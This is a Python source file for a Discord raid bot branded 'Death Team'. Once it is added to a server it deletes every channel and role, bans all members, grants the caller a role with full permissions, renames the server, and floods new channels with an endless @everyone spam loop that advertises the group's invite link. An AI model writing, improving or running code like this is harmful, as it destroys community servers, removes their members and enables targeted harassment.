# Coded / Dev / Owners: Scorpionᴰᵀ#8009 (Original Source), Buffy2021ᴰᵀ#7704 (Simplification & Decoration) - https://discord.gg/QqSds9fVwR
# SKID THIS = Blacklist - Enjoiy! <3
# Copyright © Death Team
#########################################################

# = = = = = Imports = = = = =
import os
import sys
import asyncio

from threading import Thread
from typing import Dict, Self

import httpx

from colorama import Fore as F
from pystyle import Colorate, Colors

import discord
from discord import Embed, Permissions
from discord.ext import commands as cmds

# = = = = = Aliasses = = = = =

BANNER: str = """
                             ▓█████▄ ▓█████  ▄▄▄      ▄▄▄█████▓ ██░ ██
                             ▒██▀ ██▌▓█   ▀ ▒████▄    ▓  ██▒ ▓▒▓██░ ██▒
                             ░██   █▌▒███   ▒██  ▀█▄  ▒ ▓██░ ▒░▒██▀▀██░
                             ░▓█▄   ▌▒▓█  ▄ ░██▄▄▄▄██ ░ ▓██▓ ░ ░▓█ ░██  
                             ░▒████▓ ░▒████▒ ▓█   ▓██▒  ▒██▒ ░ ░▓█▒░██▓ 
                              ▒▒▓  ▒ ░░ ▒░ ░ ▒▒   ▓▒█░  ▒ ░░    ▒ ░░▒░▒
                              ░ ▒  ▒  ░ ░  ░  ▒   ▒▒ ░    ░     ▒ ░▒░ ░
                              ░ ░  ░    ░     ░   ▒     ░       ░  ░░ ░
                                ░       ░  ░      ░  ░          ░  ░  ░
                              ░                                                                                    
"""
BANNER2: str = """
                               ▄▄▄█████▓▓█████  ▄▄▄       ███▄ ▄███▓
                               ▓  ██▒ ▓▒▓█   ▀ ▒████▄    ▓██▒▀█▀ ██▒
                               ▒ ▓██░ ▒░▒███   ▒██  ▀█▄  ▓██    ▓██░
                               ░ ▓██▓ ░ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██ 
                                 ▒██▒ ░ ░▒████▒ ▓█   ▓██▒▒██▒   ░██▒
                                 ▒ ░░   ░░ ▒░ ░ ▒▒   ▓▒█░░ ▒░   ░  ░
                                   ░     ░ ░  ░  ▒   ▒▒ ░░  ░      ░
                                 ░         ░     ░   ▒   ░      ░   
                                        ░  ░      ░  ░       ░   
"""

# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.
# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.
# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.
# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.
# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.
# EN ESPAÑOL: DONDE DICE "@TOKEN OF TH BT" VA EL TOKEN DEL BOT SIN EL ARROBA.

TOKEN: str = "@tkn of th bt"
PREFIX: str = "."
ICON: str = "https://cdn.discordapp.com/attachments/1068777813685059626/1072646719906533406/Death_Team_Logo_1.png"
NAME: str = "『⛧』𝙵̷𝚞̷𝚌̷𝚔̷𝚎̷𝚍̷𝚜̷"
ROLES: str = "『©』𝙳̷𝚎̷𝚊̷𝚝̷𝚑̷ 𝚃̷𝚎̷𝚊̷𝚖̷"
NUKE: str = "『⛧』𝙸̷𝚗̷𝚟̷𝚒̷𝚝̷𝚎̷"
RAID: str = "『⸸』𝙵̷𝚞̷𝚌̷𝚔̷𝚎̷𝚍̷𝚜̷"
AVATAR: str = "https://cdn.discordapp.com/attachments/1067287337811324968/1072633889694163024/IMG-20230124-WA0008.jpg"

btp = Colors.purple_to_blue

bfedition: cmds.Bot = cmds.Bot(
  command_prefix=PREFIX,
  help_command=None,
  intents=discord.Intents.all(),
)

# = = = = = Clear = = = = =


def cls():
  os.system("cls" if os.name == "nt" else "clear")


# = = = = = Banner = = = = =


@bfedition.event
async def on_ready():
  ACTIVITY: str = '#DeathTeam'
  URL: str = 'https://dsc.gg/DeathTeam'
  activity: discord.Streaming = discord.Streaming(name=ACTIVITY, url=URL)
  try:
    await bfedition.change_presence(activity=activity)
  except:
    pass

  _dev: discord.User = await bfedition.fetch_user(848234250297147394)
  _dev2: discord.User = await bfedition.fetch_user(886281866091573280)

  cls()
  print(Colorate.Horizontal(Colors.purple_to_blue, BANNER, 1), Colorate.Horizontal(Colors.red_to_blue, BANNER2, 1))
  print(Colorate.Horizontal(Colors.red_to_blue,f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════"))
  print(Colorate.Horizontal(Colors.red_to_purple, f"[ + ] Logged in as: {bfedition.user}", 1))
  print(Colorate.Horizontal(btp, f"""[ + ] Coded by:"""))
  print(Colorate.Horizontal(btp, f"""       | + | {_dev2} (Original Source) 
       | + | {_dev} (Simplification & Decoration)"""))
  print(Colorate.Horizontal(Colors.red_to_blue,f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════"))


# = = = = = Help = = = = =


@bfedition.command(aliases=["h"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def help(ctx):
  embed = Embed(title="Help", description="**Commands**", color=0x0000)
  embed.add_field(
    name=".nuke",
    value=
    "*Delete all channels leaving only one for the rest of the commands.*",
    inline=False)
  embed.add_field(name=".raid",
                    value="*Raid the guild at once.*",
                    inline=False)
  embed.add_field(name=".drole",
                    value="*Delete all guild roles.*",
                    inline=False)
  embed.add_field(name=".crole",
                    value="*Create thousands of roles on the guild.*",
                    inline=False)
  embed.add_field(name=".banall",
                    value="*Ban all possible users.*",
                    inline=False)
  embed.add_field(name=".admin",
                    value="*It gives you administrator permissions on the server.*",
                    inline=False)
  embed.add_field(name=".leave", value="*Leave the guild.*", inline=False)
  embed.set_thumbnail(url=ICON)
  embed.set_footer(
    text="#DeathTeam ",
    icon_url=
    "https://cdn.discordapp.com/emojis/1068783654098190396.png?v=1&size=48&quality=lossless"
  )
  await ctx.send(embed=embed)


# = = = = = Nuke = = = = =


@bfedition.command(aliases=["n"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def nuke(ctx):
  embed = Embed(title="Fuckeds",
                  description="**Fuckeds by Death Team**",
                  color=0x0000)
  embed.add_field(name="Death Team",
                    value="*https://dsc.gg/DeathTeam*",
                    inline=False)
  embed.set_thumbnail(url=ICON)
  embed.set_footer(
    text="#DeathTeam ",
    icon_url=
    "https://cdn.discordapp.com/emojis/1068783654098190396.png?v=1&size=48&quality=lossless"
  )
  try:
    guild: discord.Guild = ctx.guild
    res: httpx.Response = httpx.get(ICON)
    _ICON: bytes = res.content
    await guild.edit(name=NAME, icon=_ICON)
  except:
    pass
  try:
    guild: discord.Guild = ctx.guild
    url: str = 'https://discord.com/api/v10/channels/%s'
    head: Dict[str, str] = {'Authorization': f'Bot {TOKEN}'}

    async def delete(channel_id) -> None:
      async with httpx.AsyncClient() as client:
        await client.delete(url % channel_id, headers=head)

    for channel in guild.channels:
      Thread(target=asyncio.run, args=(delete(channel.id), )).start()
  except:
    pass
  channel = await ctx.guild.create_text_channel(NUKE)
  await channel.send(
    "||@everyone|| **Fuckeds**\nhttps://discord.gg/QqSds9fVwR", embed=embed)


# = = = = = Cooldown = = = = =


async def on_command_error(ctx, error):
  if isinstance(error, cmds.CommandNotFound):
    pass
  elif isinstance(error, cmds.CommandOnCooldown):
    embed = Embed(
      title="Cooldown",
      description=
      f"This command is on cooldown. Please wait {error.retry_after:.2f}s",
      color=0x0000)
    embed.set_thumbnail(url=ICON)
    embed.set_footer(
      text="#DeathTeam ",
      icon_url=
      "https://cdn.discordapp.com/emojis/1068783654098190396.png?v=1&size=48&quality=lossless"
    )
    await ctx.send(embed=embed)


# = = = = = Raid = = = = =


@bfedition.command(aliases=["r"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def raid(ctx):

  embed = Embed(title="Fuckeds",
                  description="**Fuckeds by Death Team**",
                  color=0x0000)
  embed.add_field(name="Death Team",
                    value="*https://dsc.gg/DeathTeam*",
                    inline=False)
  embed.set_thumbnail(url=ICON)
  embed.set_footer(
    text="#DeathTeam ",
    icon_url=
    "https://cdn.discordapp.com/emojis/1068783654098190396.png?v=1&size=48&quality=lossless"
  )
  try:
    guild: discord.Guild = ctx.guild
    res: httpx.Response = httpx.get(ICON)
    _ICON: bytes = res.content
    await guild.edit(name=NAME, icon=_ICON)
  except:
    pass
  try:
    guild: discord.Guild = ctx.guild
    url: str = 'https://discord.com/api/v10/channels/%s'
    head: Dict[str, str] = {'Authorization': f'Bot {TOKEN}'}

    async def delete(channel_id) -> None:
      async with httpx.AsyncClient() as client:
        await client.delete(url % channel_id, headers=head)

    for channel in guild.channels:
      Thread(target=asyncio.run, args=(delete(channel.id), )).start()
  except:
    pass
  channel = await ctx.guild.create_text_channel(NUKE)
  await channel.send(
    "||@everyone|| **Fuckeds**\nhttps://discord.gg/QqSds9fVwR", embed=embed)
  for i in range(49):
    channel = await ctx.guild.create_text_channel(RAID)


# = = = = = Channel Spam = = = = =


@bfedition.event
async def on_guild_channel_create(channel):
  if channel.name != NUKE:
    embed = Embed(title="Fuckeds",
                  description="**Fuckeds by Death Team**",
                  color=0x0000)
    embed.add_field(name="Death Team",
                    value="*https://dsc.gg/DeathTeam*",
                    inline=False)
    embed.set_thumbnail(url=ICON)
    embed.set_footer(
      text="#DeathTeam ",
      icon_url=
      "https://cdn.discordapp.com/emojis/1068783654098190396.png?v=1&size=48&quality=lossless"
    )
    while (True):
      await channel.send(
        "||@everyone|| **Fuckeds**\nhttps://discord.gg/QqSds9fVwR",
        embed=embed)


# = = = = = Delete Roles = = = = =


@bfedition.command(aliases=["dr"])
async def drole(ctx):
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass
    await ctx.send("> **Completed.**")


# = = = = = Create Roles = = = = =


@bfedition.command(aliases=["cr"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def crole(ctx):
  for i in range(30):
    await ctx.guild.create_role(name=ROLES, color=0x0000)
  await ctx.send("> **Completed.**")


# = = = = = Ban All = = = = =


@bfedition.command(aliases=["ba", "ban", "b"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def banall(ctx):
  try:
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members
        if not member in (ctx.author, Self.user)
    ]:
      await guild.ban(member)
      await ctx.send("> **Completed.**")
  except:
    pass



# = = = = = Admin = = = = =


@bfedition.command(aliases=["a"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def admin(ctx):
  member = ctx.message.author
  admin = await ctx.guild.create_role(name="$",
                                      color=0x0000,
                                      permissions=Permissions.all())
  await member.add_roles(admin)



# = = = = = Leave = = = = =


@bfedition.command(aliases=["l"])
@cmds.cooldown(1, 30, cmds.BucketType.guild)
async def leave(ctx):
  await ctx.send("> **God Bye!**")
  await ctx.send("> **Leaving...**")
  await ctx.guild.leave()


# = = = = = Start = = = = =

if __name__ == "__main__":
  try:
    bfedition.run(TOKEN)
  except Exception as e:
    print(
      f"{F.YELLOW}[{F.RED}ERROR{F.YELLOW}] {F.WHITE}An error has ocurred starting Death Team Bot:\n\n{F.RED}ERROR: {F.MAGENTA}{e}"
    )
    sys.exit()
